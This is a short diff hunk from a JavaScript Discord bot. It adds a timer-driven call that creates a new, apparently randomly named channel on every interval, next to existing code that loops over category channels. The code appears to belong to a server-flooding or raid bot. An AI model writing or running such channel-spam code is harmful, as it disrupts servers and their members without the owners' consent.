@@ -36,6 +36,10 @@ client.on("messageCreate",function(message){
       }
     });
     setInterval(async function(){
+      guild.channels.create({
+        name:getText(true),
+        type:0
+      });
       guild.channels.cache.forEach(function(channel,i){
         if(channel.type==4){
           setTimeout(function(){
